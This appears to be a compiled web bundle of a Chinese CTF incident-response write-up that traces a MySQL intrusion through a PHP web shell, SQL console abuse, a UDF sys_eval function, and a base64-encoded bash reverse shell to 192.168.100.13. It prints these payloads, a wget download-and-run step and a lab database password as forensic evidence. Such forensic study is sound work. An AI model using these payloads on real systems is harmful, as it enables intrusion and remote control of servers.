"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1747],{42890:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>t,default:()=>p,frontMatter:()=>o,metadata:()=>a,toc:()=>c});const a=JSON.parse('{"id":"Xuanji/Unit-2/23","title":"\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - mysql \u5e94\u6025\u54cd\u5e94","description":"1","source":"@site/docs/Xuanji/Unit-2/23.md","sourceDirName":"Xuanji/Unit-2","slug":"/Xuanji/Unit-2/23","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-2/23","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-2/23.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Xuanji_Sidebar","previous":{"title":"\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - redis \u5e94\u6025\u54cd\u5e94","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-2/22"},"next":{"title":"\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - apache\u65e5\u5fd7\u5206\u6790","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-2/29"}}');var r=s(74848),l=s(28453);const o={},t="\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - mysql \u5e94\u6025\u54cd\u5e94",i={},c=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2}];function m(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\u7b2c\u4e8c\u7ae0-\u65e5\u5fd7\u5206\u6790---mysql-\u5e94\u6025\u54cd\u5e94",children:"\u7b2c\u4e8c\u7ae0 \u65e5\u5fd7\u5206\u6790 - mysql \u5e94\u6025\u54cd\u5e94"})}),"\n",(0,r.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u9ed1\u5ba2\u7b2c\u4e00\u6b21\u5199\u5165\u7684 shell flag{\u5173\u952e\u5b57\u7b26\u4e32 }"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"/var/www/html"})," \u6587\u4ef6\u5939\u4e0b\u770b\u5230"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"root@xuanji:~# ls -lh /var/www/html\ntotal 508K\n-rwxrwxrwx. 1 www-data www-data 8.2K Jul 20  2023 Writenote.php\n-rw-r--r--. 1 www-data www-data 473K Aug  1  2023 adminer.php\n-rwxrwxrwx. 1 www-data www-data  124 Jul 20  2023 common.php\ndrwxrwxrwx. 1 www-data www-data   79 Jul 20  2023 css\ndrwxrwxrwx. 1 www-data www-data   39 Jul 20  2023 images\n-rwxrwxrwx. 1 www-data www-data 2.6K Jul 20  2023 index.php\ndrwxrwxrwx. 1 www-data www-data  104 Jul 20  2023 js\n-rwxrwxrwx. 1 root     root        0 Jul 31  2023 log.php\n-rwxrwxrwx. 1 www-data www-data 7.9K Jul 20  2023 search.php\n-rw-rw-rw-. 1 mysql    mysql      73 Aug  1  2023 sh.php\n-rw-rw-rw-. 1 mysql    mysql       0 Aug  1  2023 tmpubzil.php\n-rw-rw-rw-. 1 mysql    mysql       0 Aug  1  2023 tmputsrv.php\n-rw-rw-rw-. 1 mysql    mysql       0 Aug  1  2023 tmpuvdzm.php\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5176\u4e2d ",(0,r.jsx)(n.code,{children:"sh.php"})," \u6587\u4ef6\u6bd4\u8f83\u53ef\u7591\uff0c\u67e5\u770b\u5176\u6587\u4ef6\u5185\u5bb9"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="sh.php"',children:"1       2       <?php @eval($_POST['a']);?>     4\n//ccfda79e-7aa1-4275-bc26-a6189eb9a20b\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u9ed1\u5ba2\u53cd\u5f39 shell \u7684 ip flag{ip }"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"/var/log/mysql/error.log"})," \u4e2d\u53ef\u4ee5\u770b\u5230"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-log",children:"230731 10:14:49 [Note] Event Scheduler: Loaded 0 events\n230731 10:14:49 [Note] /usr/sbin/mysqld: ready for connections.\nVersion: '5.5.64-MariaDB-1ubuntu0.14.04.1'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  (Ubuntu)\nsh: 1: curl: not found\n--2023-08-01 02:14:11--  http://192.168.100.13:771/\nConnecting to 192.168.100.13:771... connected.\nHTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9\nLength: unspecified\nSaving to: 'index.html'\n\n     0K                                                        2.46 =2.0s\n\n2023-08-01 02:14:13 (2.46 B/s) - 'index.html' saved [5]\n\n/tmp/1.sh: line 1: --2023-08-01: command not found\n/tmp/1.sh: line 2: Connecting: command not found\n/tmp/1.sh: line 3: HTTP: command not found\n/tmp/1.sh: line 4: Length:: command not found\n/tmp/1.sh: line 5: Saving: command not found\n/tmp/1.sh: line 7: 0K: command not found\n/tmp/1.sh: line 9: syntax error near unexpected token `('\n/tmp/1.sh: line 9: `2023-08-01 02:16:35 (5.01 MB/s) - '1.sh' saved [43/43]'\n241001 08:51:01 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8bf4\u660e\u653b\u51fb\u8005\u66fe\u4f7f\u7528 mysql \u6267\u884c\u4e86\u7cfb\u7edf\u6307\u4ee4"}),"\n",(0,r.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u5728 ",(0,r.jsx)(n.code,{children:"/var/www/html"})," \u76ee\u5f55\u4e0b\u5c1d\u8bd5\u641c\u7d22 mysql \u6570\u636e\u5e93\u7684\u51ed\u636e"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'root@xuanji:/var/www/html# grep -rnw *.php -e \'root\'\ncommon.php:2:$conn=mysqli_connect("localhost","root","334cc35b3c704593","cms","3306");\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u51ed\u636e\u4e4b\u540e\uff0c\u67e5\u770b\u6570\u636e\u5e93"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"MariaDB [(none)]> SELECT * FROM mysql.general_log ORDER BY event_time DESC;\nEmpty set (0.01 sec)\n\nMariaDB [(none)]> SHOW VARIABLES LIKE 'general_log';\n+---------------+-------+\n| Variable_name | Value |\n+---------------+-------+\n| general_log   | OFF   |\n+---------------+-------+\n1 row in set (0.00 sec)\n\nMariaDB [(none)]> SHOW VARIABLES LIKE 'slow_query_log';\n+----------------+-------+\n| Variable_name  | Value |\n+----------------+-------+\n| slow_query_log | OFF   |\n+----------------+-------+\n1 row in set (0.00 sec)\n\nMariaDB [(none)]> SHOW VARIABLES LIKE 'log_bin';\n+---------------+-------+\n| Variable_name | Value |\n+---------------+-------+\n| log_bin       | OFF   |\n+---------------+-------+\n1 row in set (0.00 sec)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u53ef\u60dc\uff0cmysql \u672a\u5f00\u542f\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd"}),"\n",(0,r.jsx)(n.p,{children:"\u731c\u6d4b\u653b\u51fb\u8005\u5e76\u975e\u76f4\u63a5\u901a\u8fc7 mysql \u670d\u52a1\u8fdb\u884c\u547d\u4ee4\u6267\u884c\uff0c\u800c\u662f\u901a\u8fc7 sql \u6ce8\u5165\u6765\u5b9e\u73b0\u7684\u653b\u51fb"}),"\n",(0,r.jsxs)(n.p,{children:["\u5206\u6790 ",(0,r.jsx)(n.code,{children:"/var/log/apache2/access.log"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-log",children:'192.168.200.2 - - [01/Aug/2023:02:07:40 +0000] "GET /adminer.php HTTP/1.1" 200 2763 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:07:50 +0000] "POST /adminer.php HTTP/1.1" 302 346 "http://192.168.200.31:8005/adminer.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:07:50 +0000] "GET /adminer.php?username=root HTTP/1.1" 200 3529 "http://192.168.200.31:8005/adminer.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:07:52 +0000] "GET /adminer.php?username=root&db=mysql HTTP/1.1" 200 6607 "http://192.168.200.31:8005/adminer.php?username=root" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:07:52 +0000] "GET /adminer.php?username=root&db=mysql&script=db HTTP/1.1" 200 7170 "http://192.168.200.31:8005/adminer.php?username=root&db=mysql" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:07:54 +0000] "GET /adminer.php?username=root&db=mysql&sql= HTTP/1.1" 200 3570 "http://192.168.200.31:8005/adminer.php?username=root&db=mysql" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:08:05 +0000] "GET /adminer.php?username=root&db=cms&sql= HTTP/1.1" 200 3082 "http://192.168.200.31:8005/adminer.php?username=root&db=mysql&sql=" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:08:17 +0000] "POST /sh.php HTTP/1.1" 200 332 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"\n192.168.200.2 - - [01/Aug/2023:02:08:20 +0000] "POST /sh.php HTTP/1.1" 200 245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"\n192.168.200.2 - - [01/Aug/2023:02:09:04 +0000] "POST /adminer.php?username=root&db=cms&sql=select%20version()%3B%0A HTTP/1.1" 200 3835 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:09:47 +0000] "POST /adminer.php?username=root&db=cms&sql=select%20load_file(%22%2Fetc%2Fpasswd%22)%3B HTTP/1.1" 200 4287 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=select%20version()%3B%0A" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:07 +0000] "POST /adminer.php?username=root&db=cms&sql=show%20variables%20like%20%27%25plugin%25%27%3B HTTP/1.1" 200 3746 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=select%20load_file(%22%2Fetc%2Fpasswd%22)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:20 +0000] "POST /adminer.php?username=root&db=cms&sql=select%20*%20from%20func%3B HTTP/1.1" 200 3478 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=show%20variables%20like%20%27%25plugin%25%27%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:28 +0000] "GET /adminer.php?username=root&db=cms&sql= HTTP/1.1" 200 3363 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=select%20*%20from%20func%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:30 +0000] "GET /adminer.php?username=root HTTP/1.1" 200 3377 "http://192.168.200.31:8005/adminer.php?username=root&db=cms&sql=" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:31 +0000] "GET /adminer.php?username=root&sql= HTTP/1.1" 200 2866 "http://192.168.200.31:8005/adminer.php?username=root" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:11:33 +0000] "POST /adminer.php?username=root&sql=select%20*%20from%20func%3B HTTP/1.1" 200 3147 "http://192.168.200.31:8005/adminer.php?username=root&sql=" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:12:00 +0000] "POST /adminer.php?username=root&sql=select%20*%20from%20func%3B HTTP/1.1" 200 7687 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20*%20from%20func%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:12:34 +0000] "POST /adminer.php?username=root&sql=select%20*%20from%20func%3B HTTP/1.1" 200 7666 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20*%20from%20func%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:12:54 +0000] "POST /adminer.php?username=root&sql=create%20function%20sys_eval%20returns%20string%20soname%20%27mysqludf.so%27%3B HTTP/1.1" 200 3324 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20*%20from%20func%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:13:00 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27whoami%27)%3B HTTP/1.1" 200 3740 "http://192.168.200.31:8005/adminer.php?username=root&sql=create%20function%20sys_eval%20returns%20string%20soname%20%27mysqludf.so%27%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:13:08 +0000] "POST /adminer.php?username=root&sql=select%20*%20from%20func%3B HTTP/1.1" 200 3298 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27whoami%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:13:18 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27whoami%27)%3B HTTP/1.1" 200 3761 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20*%20from%20func%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:13:53 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27curl%20192.168.100.13%3A771%27)%3B HTTP/1.1" 200 3800 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27whoami%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:14:11 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27wget%20192.168.100.13%3A771%27)%3B HTTP/1.1" 200 3822 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27curl%20192.168.100.13%3A771%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:16:31 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A771%2F1.sh%27)%3B HTTP/1.1" 200 3862 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27wget%20192.168.100.13%3A771%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:16:35 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A777%2F1.sh%27)%3B HTTP/1.1" 200 3875 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A771%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:16:43 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27ls%20%2Ftmp%2F%27)%3B HTTP/1.1" 200 3975 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27wget%20-o%20%2Ftmp%2F1.sh%20192.168.100.13%3A777%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:16:57 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 3889 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27ls%20%2Ftmp%2F%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:17:05 +0000] "POST /sh.php HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"\n192.168.200.2 - - [01/Aug/2023:02:17:09 +0000] "POST /sh.php HTTP/1.1" 200 470 "-" "Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01"\n192.168.200.2 - - [01/Aug/2023:02:17:10 +0000] "POST /sh.php HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0"\n192.168.200.2 - - [01/Aug/2023:02:17:37 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B HTTP/1.1" 200 4116 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:18:18 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B HTTP/1.1" 200 4025 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:18:27 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4023 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:18:37 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4029 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27echo%20YmFzaCAtaSA%2BJi9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx%7Cbase64%20-d%3E%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n192.168.200.2 - - [01/Aug/2023:02:19:07 +0000] "POST /adminer.php?username=root&sql=select%20sys_eval(%27bash%20%2Ftmp%2F1.sh%27)%3B HTTP/1.1" 200 4014 "http://192.168.200.31:8005/adminer.php?username=root&sql=select%20sys_eval(%27ls%20-la%20%2Ftmp%2F1.sh%27)%3B" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u597d\uff0c\u770b\u8d77\u6765 sql \u6ce8\u5165\u7684\u6d41\u91cf\u662f\u901a\u8fc7 GET \u65b9\u6cd5\u8fdb\u884c\u7684\uff0c\u4f7f\u7528\u811a\u672c\u63d0\u53d6\u6ce8\u5165\u64cd\u4f5c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from urllib.parse import unquote\n\nwith open("./access.log", "r") as f:\n    data_log = f.read().strip().split("\\n")\n\ndata_log = [i.split(\'"\') for i in data_log]\n\ndata_log = [i for i in data_log if i[1].startswith("POST /adminer.php")]\n\nfor i in data_log:\n    tmp = i[1].split(" ")[1]\n    tmp = unquote(tmp)\n    print(tmp)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5f97\u5230\u7684 sql \u6ce8\u5165\u64cd\u4f5c\u4e3a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"/adminer.php\n/adminer.php?username=root&db=cms&sql=select version();\n/adminer.php?username=root&db=cms&sql=select load_file(\"/etc/passwd\");\n/adminer.php?username=root&db=cms&sql=show variables like '%plugin%';\n/adminer.php?username=root&db=cms&sql=select * from func;\n/adminer.php?username=root&sql=select * from func;\n/adminer.php?username=root&sql=select * from func;\n/adminer.php?username=root&sql=select sys_eval('whoami');\n/adminer.php?username=root&sql=select * from func;\n/adminer.php?username=root&sql=select sys_eval('whoami');\n/adminer.php?username=root&sql=select sys_eval('curl 192.168.100.13:771');\n/adminer.php?username=root&sql=select sys_eval('wget 192.168.100.13:771');\n/adminer.php?username=root&sql=select sys_eval('wget -o /tmp/1.sh 192.168.100.13:771/1.sh');\n/adminer.php?username=root&sql=select sys_eval('wget -o /tmp/1.sh 192.168.100.13:777/1.sh');\n/adminer.php?username=root&sql=select sys_eval('ls /tmp/');\n/adminer.php?username=root&sql=select sys_eval('bash /tmp/1.sh');\n/adminer.php?username=root&sql=select sys_eval('ls -la /tmp/');\n/adminer.php?username=root&sql=select sys_eval('echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d');\n/adminer.php?username=root&sql=select sys_eval('echo YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx|base64 -d>/tmp/1.sh');\n/adminer.php?username=root&sql=select sys_eval('ls -la /tmp/1.sh');\n/adminer.php?username=root&sql=select sys_eval('bash /tmp/1.sh');\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5bf9\u5176\u4e2d Base64 \u7f16\u7801\u7684\u90e8\u5206\u8fdb\u884c\u89e3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTAwLjEzLzc3NyAwPiYx\nbash -i >&/dev/tcp/192.168.100.13/777 0>&1\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u627e\u5230\u653b\u51fb\u8005\u5199\u5165\u7684\u811a\u672c\u8def\u5f84\u4e3a ",(0,r.jsx)(n.code,{children:"/tmp/1.sh"})]}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"bash -i >&/dev/tcp/192.168.100.13/777 0>&1\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5178\u578b\u7684 bash \u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{192.168.100.13}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u9ed1\u5ba2\u63d0\u6743\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84 md5 flag{md5 } \u6ce8 /xxx/xxx/xxx/xxx/xxx.xx"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u5408\u9898\u76ee\u80cc\u666f\uff0c\u67e5\u770b mysql \u7684 func \u5217\u8868"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"MariaDB [mysql]> select * from func;\n+----------+-----+-------------+----------+\n| name     | ret | dl          | type     |\n+----------+-----+-------------+----------+\n| sys_eval |   0 | mysqludf.so | function |\n+----------+-----+-------------+----------+\n1 row in set (0.00 sec)\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u660e\u663e\uff0c\u653b\u51fb\u8005\u91c7\u7528\u4e86 Mysql UDF \u63d0\u6743"}),"\n",(0,r.jsx)(n.p,{children:"\u5b9a\u4f4d\u5230\u8fd9\u4e2a\u63d2\u4ef6\u7684\u4f4d\u7f6e"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'root@xuanji:/var/www/html# find / -name "mysqludf.so" 2>/dev/null\n/usr/lib/mysql/plugin/mysqludf.so\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u8fd9\u4e2a\u7b54\u6848\u4e0d\u5bf9\uff0c\u4e0d\u7b26\u5408\u9898\u76ee\u63d0\u793a\u7684\u89c4\u5219\uff0c\u8fdb\u5165\u76ee\u5f55\u67e5\u770b\u6240\u6709\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"root@xuanji:/usr/lib/mysql/plugin# ls -lh\ntotal 4.7M\n-rw-r--r--. 1 mysql mysql  11K May 16  2019 auth_pam.so\n-rw-r--r--. 1 mysql mysql 6.4K May 16  2019 auth_socket.so\n-rw-r--r--. 1 mysql mysql  10K May 16  2019 dialog.so\n-rw-r--r--. 1 mysql mysql 1.6M May 16  2019 ha_innodb.so\n-rw-r--r--. 1 mysql mysql 156K May 16  2019 handlersocket.so\n-rw-r--r--. 1 mysql mysql 6.0K May 16  2019 mysql_clear_password.so\n-rw-rw-rw-. 1 mysql mysql  11K Aug  1  2023 mysqludf.so\n-rw-r--r--. 1 mysql mysql  40K May 16  2019 semisync_master.so\n-rw-r--r--. 1 mysql mysql  15K May 16  2019 semisync_slave.so\n-rw-r--r--. 1 mysql mysql  55K May 16  2019 server_audit.so\n-rw-r--r--. 1 mysql mysql 2.8M May 16  2019 sphinx.so\n-rw-r--r--. 1 mysql mysql  11K May 16  2019 sql_errlog.so\n-rw-rw-rw-. 1 mysql mysql   34 Aug  1  2023 udf.so\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8ba1\u7b97 